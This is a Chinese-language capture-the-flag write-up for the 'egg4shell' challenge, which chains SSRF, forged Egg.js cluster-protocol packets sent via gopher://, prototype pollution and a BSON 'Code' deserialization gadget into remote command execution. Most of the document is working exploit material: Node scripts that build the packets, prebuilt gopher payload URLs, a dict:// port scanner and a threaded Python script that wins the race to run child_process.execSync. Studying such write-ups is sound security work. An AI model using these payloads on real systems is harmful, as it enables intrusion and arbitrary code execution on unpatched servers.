# egg4shell

## 题目简述

题目是 Egg.js 多进程应用利用链。核心入口是 `/snapshot` SSRF 和快照写入能力：先借 SSRF 访问本机高端口的 egg cluster 通信服务，再通过 watcher 事件参数污染原型；同时利用 Mongo/BSON 中 `_bsontype: Code` 与 `evalFunctions` 的反序列化行为，让被阻塞的 Mongo 查询返回时执行写入的 JavaScript 代码。整条链需要配合竞态，因为污染后正常查询会失败。

## 解题过程

### 步骤

1. 尝试找到以下漏洞或特性：

   1. **通过 /snapshot 端点触发 SSRF**

`snapshot` 接口会读取 `ctx.query.url`，用 `curly.get()` 拉取内容并写入 `/tmp/snapshots/<md5(ctx.ip)>`。

```
  2. **通过 /snapshot 注入隐藏属性（_bsontype，可能是功能特性）**
```

应用在 `snapshot_end` 事件中会调用 `auditLog.log(ctx, {...})`，并把 `headers` 和 `snapshotLog` 传入日志对象。

**auditLog** 插件使用 Mongo 作为后端数据库。

```
  3. **app.watcher.watch** 回调函数中的 **prototype pollution**
```

`watcher.watch('/tmp/snapshots/**')` 会监听快照目录变更，把事件继续传给 `snapshotLogTree` 和后续处理。

`path.reduce` 中存在原型污染漏洞。

这里需要深入分析 Egg.js 的通信机制和多进程模型。可以发现，借助前面的 SSRF 与本地高端口通信即可触发这个事件，从而完全控制 watch 事件参数并触发原型污染。

```
  4. BSON 中的 prototype pollution gadget
```
---
BSON 相关安全公告 GHSA-prm5-8g2m-24gg 的关键点是：旧版 BSON 在反序列化特殊类型字段时会根据 `_bsontype` 选择处理逻辑；当类型为 `Code` 且 `evalFunctions` 允许时，存储在字段里的 JavaScript 会被求值。本题把 `_bsontype` 和 `code` 放进可控响应头/对象中，再让 Mongo 读取该字段触发执行。

结合前面的对象注入漏洞，可以注入 `_bsontype` 属性，并把 `_bsontype` 类型为 `Code` 的字段写入 Mongo。当 Mongo 取出这份数据时，会反序列化该字段；当 `evalFunctions` 属性非空时，最终会 `eval` 我们存入 Mongo 的代码，从而实现代码执行。

调试可确认存在 `Base64ToString` 这类可用 gadget，可把传入内容解码后进入执行链。

注意，污染之后 MongoDB 查询会失败，所以需要赢下竞态。做法是先并发发起多次查询，然后触发污染，其中一部分查询会成功返回并触发 gadget，进而实现远程代码执行。

```
  5. Egg.js 应用中的 SSRF 利用
```

Egg.js cluster-client 文档说明了 master/worker 间的本地通信模型：Leader 会监听一个随机本地高端口，Follower 通过内部协议注册 channel 并触发方法调用。题目中这个端口缺少额外认证，所以可以用 SSRF 扫出端口后，通过 gopher 构造 cluster 协议包直接调用 watcher 的 `_onChange`。

Agent/Worker 之间存在端口竞争：Leader 与 Follower 通过 TCP 连接协作，Client 连接时需要命中可控 worker。

Leader 节点会开放一个随机本地高端口，用来接收 Follower 连接，并且二者通信没有额外安全检查。

2. 可以使用 **dict://** 探测随机端口。

3. 通过 **/snapshot** 向 Mongo 注入恶意 JSON 对象，为后续触发 gadget 做准备。

`_bsontype` 和 `code` 字段放在 HTTP 响应头中。

最终 payload 形态是 JSON：`{"__jsontype":"Code","code":"require('child_process').execSync('touch /tmp/pwned');"}`。

4. 多线程请求 `/query` 接口，触发 Mongo 查询阻塞。

5. 构造本地通信数据包，使用 gopher 协议执行 SSRF 攻击，触发原型污染，并等待阻塞的 Mongo 查询返回以触发 gadget。

### 利用

1. SSRF 数据包构造代码

``` .
├── const.js
├── exp.js
├── package-lock.json
├── package.json
├── protocol
│   ├── byte_buffer.js
│   ├── packet.js
│   └── request.js
└── utils.js
'use strict';
const ByteBuffer = require('byte');
// 避免创建太多 buffer
module.exports = new ByteBuffer({
  size: 1024 * 1024,
});
'use strict';
const Constant = require('../const');
const byteBuffer = require('./byte_buffer');
const Long = require('long');
/**
 * 0         1         2                   4
                                         12
 * +---------+---------+-------------------+-------------------------------------
---
---------------------------------------+
 * | version | req/res |      reserved     |
请求 id                                    |
 * +---------------------------------------+-------------------------------------
--+---------------------------------------+
 * |                timeout                |       connection object length
|       application object length       |
 * +---------------------------------------+-------------------+-----------------
--+---------------------------------------+
 * |         conn object (JSON format) ...                    |
       app object                         |
 * +-----------------------------------------------------------+
                                          |
 * | ...
                                         |
 * +-----------------------------------------------------------------------------
---
---------------------------------------+
 *
 * 数据包协议：
 *   (1B): 协议版本
 *   (1B): req/res
 *   (2B): reserved
 *   (8B): 请求 id
 *   (4B): timeout
 *   (4B): 连接对象长度
 *   (4B): 应用对象长度
---
------------------------------
 *   连接对象（JSON 格式）
---
------------------------------
 *   应用对象
 */
class Packet {
  /**
   * cluster 协议数据包
   *
   * @param {Object} options
   *   - @param {Number} id - 标识符
   *   - @param {Number} type - req/res
   *   - @param {Number} timeout - 超时时间
   *   - @param {Object} connObj - 连接对象
   *   - @param {Buffer} data - 应用数据
   * @class
   */
  constructor(options) {
    this.id = options.id;
    this.type = options.type;
    this.timeout = options.timeout;
    this.connObj = options.connObj;
    this.data = typeof options.data === 'string' ? Buffer.from(options.data) :
options.data;
  }
  get isResponse() {
    return this.type === Constant.RESPONSE;
  }
  encode() {
    const header = Buffer.from([ Constant.VERSION, this.type, 0, 0 ]);
    const connBuf = Buffer.from(JSON.stringify(this.connObj));
    const appLen = this.data ? this.data.length : 0;
    byteBuffer.reset();
    byteBuffer.put(header);
    byteBuffer.putLong(this.id);
    byteBuffer.putInt(this.timeout);
    byteBuffer.putInt(connBuf.length);
    byteBuffer.putInt(appLen);
    byteBuffer.put(connBuf);
    if (appLen) {
      byteBuffer.put(this.data);
    }
    return byteBuffer.array();
  }
  static decode(buf) {
    const isResponse = buf[1] === Constant.RESPONSE;
    const id = new Long(
      buf.readInt32BE(8), // low, high
        buf.readInt32BE(4)
        ).toNumber();
        const timeout = buf.readInt32BE(12);
        const connLength = buf.readInt32BE(16);
        const appLength = buf.readInt32BE(20);
        const connBuf = Buffer.alloc(connLength);
        buf.copy(connBuf, 0, 24, 24 + connLength);
        const connObj = JSON.parse(connBuf);
        let data;
        if (appLength) {
        data = Buffer.alloc(appLength);
        buf.copy(data, 0, 24 + connLength, 24 + connLength + appLength);
        }
        return {
        id,
        isResponse,
        timeout,
        connObj,
        data,
        };
        }
        }
        module.exports = Packet;
'use strict';
const utils = require('../utils');
const Packet = require('./packet');
const Constant = require('../const');
class Request extends Packet {
  constructor(options) {
    const id = utils.nextId();
    super(Object.assign({
      id,
      type: Constant.REQUEST,
    }, options));
  }
}
module.exports = Request;
const net = require("net")
const Request = require('./protocol/request')
const Packet = require("./protocol/packet")
const transcode = require('serialize-json');
function onReadable() {
  header = null;
  bodyLength = null;
  body = null;
  if (!header) {
    header = socket.read(24);
    if (!header) {
      return;
    }
  }
  if (!bodyLength) {
    bodyLength = header.readInt32BE(16) + header.readInt32BE(20);
  }
  body = socket.read(bodyLength);
  if (!body) {
    return;
  }
  // 第一个数据包用于注册到 channel
  const packet = Packet.decode(Buffer.concat([header, body], 24 + bodyLength));
  if(packet.data){
    console.log(transcode.decode(packet.data));
  }
  console.log(packet)
}
port = 64203
host = "127.0.0.1"
const socket = net.connect({
  port, host
});
socket.once('connect', () => {
  // 连接后把超时设置回 0
  socket.setTimeout(0);
  console.log("connected")
});
socket.on('error', err => {
  console.log(err)
})
socket.on('readable', onReadable);
socket.once('close', () => { console.log('close') });
function heartBeatPacket() {
  const heartbeat = new Request({
    connObj: {
      type: 'heartbeat',
    },
    timeout: 1000
  });
  return heartbeat.encode();
}
//
// header.readInt32BE(16)
const p1 = new Request({
  connObj: {
    type: 'register_channel',
    channelName: 'Watcher',
  },
  timeout: 60000
});
args = [{path: "/tmp/snapshots/__proto__/evalFunctions", event: "233"}]
let argsBufLength = 0;
const arr = [];
for (const arg of args) {
  const argBuf = transcode.encode(arg);
  const len = argBuf.length;
  const buf = Buffer.alloc(4 + len);
  buf.writeInt32BE(len, 0);
  argBuf.copy(buf, 4, 0, len);
  arr.push(buf);
  argsBufLength += (len + 4);
}
data = Buffer.concat(arr, argsBufLength);
const p3 = new Request({
  connObj: {
    type: 'invoke',
    channelName: 'Watcher',
    oneway: true,
    method: "_onChange",
    argLength: 1
  },
  timeout: 1000,
  data: data
});
const isUrlSafe = (char) => {
  return /[a-zA-Z0-9\-_~.]+/.test(char)
}
const urlEncodeBytes = (buf) => {
  let encoded = ''
  for (let i = 0; i < buf.length; i++) {
    const charBuf = Buffer.from('00', 'hex')
    charBuf.writeUInt8(buf[i])
    const char = charBuf.toString()
    // 如果字符安全就直接输出，否则编码
    if (isUrlSafe(char)) {
      encoded += char
    } else {
encoded+=`%${charBuf.toString('hex').toUpperCase()}`
    }
  }
  return encoded
}
const p11 = urlEncodeBytes(p1.encode())
const p22 = urlEncodeBytes(p3.encode())
// console.log(p11+p22)
const p33 = encodeURI(p11+p22)
console.log(p33)
// console.log(p1.encode().readInt32BE(16))
// console.log(p1.encode().readInt32BE(20))
//console.log(heartBeatPacket().toString('base64'))
socket.write(p1.encode())
// socket.write(heartBeatPacket())
//console.log(p3.encode().toString('base64'))
socket.write(p3.encode())
  // heartbeat = heartBeatPacket()
  // socket.write(heartbeat)
  // curl -v 'http://127.0.0.1:7001/snapshot?
url=gopher://127.0.0.1:46709/_%2501%2500%2500%2500%2500%2500%2500%2500%2500%2500
%2500%2501%2500%2500%25EA%2560%2500%2500%25003%2500%2500%2500%2500%257B%2522type
%2522%253A%2522register_channel%2522%252C%2522channelName%2522%253A%2522Watcher%
2522%257D%2501%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2502%2500%2500%
2503%25E8%2500%2500%2500Z%2500%2500%2500%253A%257B%2522type%2522%253A%2522invoke
%2522%252C%2522channelName%2522%253A%2522Watcher%2522%252C%2522oneway%2522%253At
rue%252C%2522method%2522%253A%2522_onChange%2522%252C%2522argLength%2522%253A1%2
57D%2500%2500%25006path%257C%252Ftmp%252Fsnapshots%252F__proto__%252Fa%257Cevent
%257C233%255E%255E%255E%255E%25240%257C1%257C2%257C3%255D'
'use strict';
exports.VERSION = 1;
exports.REQUEST = 0;
exports.RESPONSE = 1;
id = 0
function nextId() {
  id += 1;
  if (id >= 999) {
    id = 1;
  }
  return id;
}
exports.nextId = nextId;
{
  "dependencies": {
    "byte": "^2.0.0",
    "long": "^5.2.1",
    "serialize-json": "^1.0.3"
  }
}
```

### 2. 最终利用

```
import requests
from concurrent.futures import ThreadPoolExecutor
def snapshot():
  burp0_url = host + "/snapshot?url=http://xxxx/1.php"
# 响应头：
#   _bsontype: Code
#   code: require('child_process').execSync('touch /tmp/pwned');delete
Object.prototype.evalFunctions
  requests.get(burp0_url)
# 原型污染
def pollution():
# curl -v 'http://127.0.0.1:7001/snapshot?
url=gopher://127.0.0.1:46709/_%2501%2500%2500%2500%2500%2500%2500%2500%2500%2500
%2500%2501%2500%2500%25EA%2560%2500%2500%25003%2500%2500%2500%2500%257B%2522type
%2522%253A%2522register_channel%2522%252C%2522channelName%2522%253A%2522Watcher%
2522%257D%2501%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2502%2500%2500%
2503%25E8%2500%2500%2500Z%2500%2500%2500%253A%257B%2522type%2522%253A%2522invoke
%2522%252C%2522channelName%2522%253A%2522Watcher%2522%252C%2522oneway%2522%253At
rue%252C%2522method%2522%253A%2522_onChange%2522%252C%2522argLength%2522%253A1%2
57D%2500%2500%25006path%257C%252Ftmp%252Fsnapshots%252F__proto__%252Fa%257Cevent
%257C233%255E%255E%255E%255E%25240%257C1%257C2%257C3%255D'
  burp0_url = host + "/snapshot?
url=gopher://127.0.0.1:"+str(lp)+"/_%2501%2500%2500%2500%2500%2500%2500%2500%250
0%2500%2500%2501%2500%2500%25EA%2560%2500%2500%25003%2500%2500%2500%2500%257B%25
22type%2522%253A%2522register_channel%2522%252C%2522channelName%2522%253A%2522Wa
tcher%2522%257D%2501%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2502%2500
%2500%2503%25E8%2500%2500%2500Z%2500%2500%2500F%257B%2522type%2522%253A%2522invo
ke%2522%252C%2522channelName%2522%253A%2522Watcher%2522%252C%2522oneway%2522%253
Atrue%252C%2522method%2522%253A%2522_onChange%2522%252C%2522argLength%2522%253A1
%257D%2500%2500%2500Bpath%257C%252Ftmp%252Fsnapshots%252F__proto__%252FevalFunct
ions%257Cevent%257C233%255E%255E%255E%255E%25240%257C1%257C2%257C3%255D"
  requests.get(burp0_url)
# 触发 RCE，并参与并发竞态
def trigger():
  burp0_url = host + "/query"
  requests.get(burp0_url)
def leak_port():
  burp0_url = host + "/snapshot?url=dict://127.0.0.1"
  try:
    for i in range(0, 65536):
      print(str(i)+" ", end="", flush=True)
      url = burp0_url + ":" + str(i)
      res = requests.get(url, timeout=1)
      if not 'error' in res.text:
        print("\nfound: "+ str(i))
        return i
  except Exception as _:
    return i
if __name__ == '__main__':
    host = "http://<target>"
# 将 <target> 替换为题目实例地址
    lp = leak_port()
# lp = 39121
    snapshot()
# 创建包含 300 个 worker 线程的线程池
    with ThreadPoolExecutor(max_workers=300) as executor:
# 启动请求任务并提交到线程池
        executor.submit(pollution)
        for _ in range(299):
            executor.submit(trigger)
    print("[+]current task finished")
```

## 方法总结

- 核心技巧：SSRF 打本机高端口、Egg.js cluster-client 内部协议伪造、原型污染、BSON `Code` gadget 与 Mongo 查询竞态。
- 识别信号：Node/Egg 应用里出现 `/snapshot` 这类可请求任意 URL 的功能、内部 watcher/channel、Mongo audit log 和可控对象字段时，应检查 SSRF 到本机 IPC/cluster 端口的可能性。
- 复用要点：这条链不是单点 RCE，必须按顺序完成端口探测、恶意 BSON 对象写入、原型污染打开 `evalFunctions`、并用并发查询赢下竞态。
